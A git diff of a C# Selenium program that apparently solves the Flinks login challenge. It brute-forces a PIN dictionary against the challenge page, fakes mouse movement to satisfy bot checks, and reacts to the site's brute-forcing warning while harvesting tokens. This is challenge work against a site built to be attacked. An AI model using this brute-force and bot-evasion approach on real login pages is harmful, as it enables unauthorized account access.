@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Threading.Tasks.Sources;
 using OpenQA.Selenium;
 using OpenQA.Selenium.Chrome;
 using OpenQA.Selenium.Interactions;
@@ -11,88 +12,131 @@ using OpenQA.Selenium.Support.UI;
 namespace FlinksLogin
 {
     class Program
-    {        
+    {
+        private static readonly string FlinksUrl = $"https://challenge.flinks.io";
+        private static readonly string LocalUrl = $"file:///Users/Aymeric/Desktop/Flinks%20Challenge.html";
+
         static void Main(string[] args)
         {
-            var automatedLoginService = new AutomatedLoginService();
+            var automatedLoginService = new AutomatedLoginService(FlinksUrl);
             automatedLoginService.Login();
         }
     }
 
     public class AutomatedLoginService
     {
-        private static readonly string FlinksUrl = $"https://challenge.flinks.io";
-        private static string ChallengeId;
-
         // twice the amount in case some events are missed
-        private static readonly int MinimumOccurenceMouseMove = 10 * 2;
+        private const int MinimumOccurenceMouseMove = 10 * 2;
+        private const int TargetOccurences = 50;
+
+        private static string _loginPageUrl;
+        private static string _challengeId;
+        private static int _occurence;
 
         private readonly IWebDriver _driver;
-        private IList<string> _passwordDictionary;
         private IList<string> _loginDictionary;
-        
-        //only needed in case login I need to continue on a different challenge id (username password not rotated)
-        private static string _currentLogin = string.Empty;
-        
-        public AutomatedLoginService()
+
+        public AutomatedLoginService(string url)
         {
             // HACK: make driver's path
             _driver = new ChromeDriver(@"/Users/Aymeric/00-Sources/flinks/FlinksLogin/bin/Debug/netcoreapp2.1");
-            _driver.Url = FlinksUrl;
-            
-            _passwordDictionary = GeneratePasswords();
+            _driver.Url = url;
+
             _loginDictionary = GeneratePasswords();
         }
 
         public void Login()
         {
-            // For debugging purposes (in case username/password are not specific to the session, who knows...)
-            var toSkip = _loginDictionary.IndexOf(_currentLogin);
-            _loginDictionary = _loginDictionary.Skip(toSkip).ToList();
-
             NavigateToLogin();
 
-            ForceLogin();
+//            var userWord = ForceLogin();
+            var userWord = "2222";
 
-            var test = "";
-        }
-
-        private void ForceLogin()
-        {
-            Console.WriteLine($"starting forcelogin... - {DateTime.Now.ToLongTimeString()}");
-            
-            foreach (var login in _loginDictionary)
+            while (_occurence <= TargetOccurences)
             {
-                Console.WriteLine($"login attempt with {login} - {DateTime.Now.ToLongTimeString()}");
-                
-                // try same login/password
-                var isLoginSuccessful = TryLogin(login, login);
-                if (isLoginSuccessful)
+                if (_occurence % 9 == 8)
                 {
-                    return;
+                    ((IJavaScriptExecutor)_driver).ExecuteScript("window.open();");
+                    _driver.SwitchTo().Window(_driver.WindowHandles.Last());
+                    _driver.Navigate().GoToUrl(_loginPageUrl);
+                    
+                }
+                
+                _driver.Url = _loginPageUrl;
+                
+                var areCredentialsStillAccepted = TryVerifyCredentials(userWord, userWord);
+
+                if (!areCredentialsStillAccepted)
+                {
+                    NavigateRandomly();
+                }
+                else
+                {
+                    RetrieveToken();
                 }
             }
-            
         }
 
-        private bool TryLogin(string login, string password)
+        private void NavigateRandomly()
         {
-            _currentLogin = login;
+            Console.WriteLine("Waiting ... ");
+            Thread.Sleep(TimeSpan.FromSeconds(10));
+
+//            _driver.Url = "https://google.ca";
+        }
+
+        private void NavigateToLogin()
+        {
+            var start = _driver.FindElement(By.LinkText("START"));
+
+            var href = start.GetAttribute("href");
+
+            var startIndex = href.LastIndexOf('/');
+            _challengeId = href.Substring(startIndex + 1, href.Length - startIndex - 1);
+            _loginPageUrl = href;
             
+            start.Click();
+        }
+
+        private string ForceLogin()
+        {
+            Console.WriteLine($"starting forcelogin... - {DateTime.Now.ToLongTimeString()}");
+
+            foreach (var userWord in _loginDictionary)
+            {
+                Console.WriteLine($"login attempt with {userWord} - {DateTime.Now.ToLongTimeString()}");
+
+                var areCredentialsCorrect = TryVerifyCredentials(userWord, userWord);
+
+                if (areCredentialsCorrect)
+                {
+                    RetrieveToken();
+                    return userWord;
+                }
+            }
+
+            throw new NotFoundException("No valid credentials in the dictionary");
+        }
+
+        private bool TryVerifyCredentials(string login, string password)
+        {
             var retryCount = 0;
 
             while (true)
             {
                 try
                 {
-                    return LoginAttempt(login, password);
+                    EnterCredentials(login, password);
+
+                    return VerifyCredentials(login, password);
                 }
                 catch (WebDriverException)
                 {
                     retryCount++;
 
-                    Console.WriteLine($"attempt #{retryCount} to login with {login} / {password} timed out - {DateTime.Now.ToLongTimeString()}");
-                    
+                    Console.WriteLine(
+                        $"attempt #{retryCount} to login with {login} / {password} timed out - {DateTime.Now.ToLongTimeString()}");
+
                     if (retryCount < 5)
                     {
                         Thread.Sleep(TimeSpan.FromSeconds(10));
@@ -105,7 +149,28 @@ namespace FlinksLogin
             }
         }
 
-        private bool LoginAttempt(string login, string password)
+        private bool VerifyCredentials(string login, string password)
+        {
+            try
+            {
+                var loginResultTitle = _driver.FindElement(By.CssSelector("h3")).Text;
+                
+                var areCredentialsRight = loginResultTitle.ToUpper().Contains("CONGRATS");
+
+                if (areCredentialsRight)
+                {
+                    Console.WriteLine($"SUCCESS!! {login} {password} - {DateTime.Now.ToLongTimeString()}");
+                    return true;
+                }
+            }
+            catch
+            {
+            }
+
+            return false;
+        }
+
+        private void EnterCredentials(string login, string password)
         {
             // Source code seems to demand a certain amount of mouse move
             // if (numberOfOccurenceMove == 10) { ... }
@@ -121,35 +186,19 @@ namespace FlinksLogin
             passwordField.SendKeys(password);
 
             passwordField.Submit();
-
-            var loginResultTitle = _driver.FindElement(By.CssSelector("h4")).Text;
-
-            var areCredentialsWrong = loginResultTitle.ToUpper().Contains("WRONG CREDENTIAL");
-            var areYouBruteForcing = loginResultTitle.ToUpper().Contains("STOP BRUTE FORCING");
-
-            if (areYouBruteForcing)
-            {
-                Console.WriteLine($"Brute Forcing - {login} {password} - {DateTime.Now.ToLongTimeString()}");
-                Console.ReadLine();
-            }
-            else if (!areCredentialsWrong)
-            {
-                Console.WriteLine($"SUCCESS!! {login} {password} - {DateTime.Now.ToLongTimeString()}");
-                Console.ReadLine();
-                return true;
-            }
-
-            return false;
         }
 
-        private void NavigateToLogin()
+        private void RetrieveToken()
         {
-            var start = _driver.FindElement(By.LinkText("START"));
-            var href = start.GetAttribute("href");
+            MoveMouseRandomly();
+            
+            var token = _driver.FindElements(By.CssSelector("b"))
+                .Select(x => x.Text)
+                .Single(x => x.Length > 50); // HACK: shallow logic but works
 
-            var startIndex = href.LastIndexOf('/');
-            ChallengeId = href.Substring(startIndex + 1, href.Length - startIndex - 1);
-            start.Click();
+            _occurence++; // HACK: would need to retrieve it from the page.
+
+            Console.WriteLine($"Challenge Id {_challengeId} - Token {token} - Occurence {_occurence}");
         }
 
         private void MoveMouseRandomly()
@@ -173,7 +222,7 @@ namespace FlinksLogin
             // 0 to 4 digits pin with values 1,2 or 3
             // 3^0 + 3^1 + 3^2 + 3^3 + 3^4 = 121 (to be verified with a calc)
             var passwords = new List<string>();
-            passwords.Add(string.Empty);    // special case with no digits
+            passwords.Add(string.Empty); // special case with no digits
 
             var currentLength = 0;
 
